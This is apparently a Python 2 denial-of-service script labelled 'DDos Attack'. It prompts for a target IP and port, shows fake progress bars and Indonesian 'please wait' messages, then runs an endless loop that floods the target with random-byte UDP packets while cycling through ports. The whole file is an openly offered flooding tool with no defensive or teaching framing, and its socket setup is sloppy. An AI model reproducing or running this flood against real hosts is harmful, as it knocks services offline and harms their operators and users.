import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,socket.SOCK_STREAM)
bytes = random._urandom(1409)
#############


os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : zhicco234"
print "github   : https://github.com/zhicco234"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
os.system("clear")
print "[=               ] 1%"
time.sleep(0)
os.system("clear")
print "[==               ] 2%"
time.sleep(0)
os.system("clear")
print "[===               ] 3%"
time.sleep(0)
os.system("clear")
print "[====              ] 4%"
time.sleep(0)
os.system("clear")
print "[=====              ] 5%"
time.sleep(10)
os.system("clear")
print "EROR SYSTEM"
time.sleep(10)
os.system("clear")
print "[============       ] 25%"
time.sleep(0)
os.system("clear")
print "[==============      ] 50%"
time.sleep(0)
os.system("clear")
print "[==================  ] 70%" 
time.sleep(0)
os.system("clear")
print "[====================] 100%"  
time.sleep(10) 
os.system("clear")
print "harap sabar"
time.sleep(10)
os.system("clear")
print "harap sabar[                      ] 0%"  
time.sleep(9)          
os.system("clear") 
print "harap sabar [====                 ] 25%"  
time.sleep(5)
os.system("clear")
print "harap sabar [==============       ] 50%"  
time.sleep(5)
os.system("clear")
print "harap sabar [=================    ] 70%"  
time.sleep(5)
os.system("clear")
print "harap sabar [====================] 100%"
time.sleep(5)
os.system("clear")
print "SEBENTAR....."
time.sleep(5)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
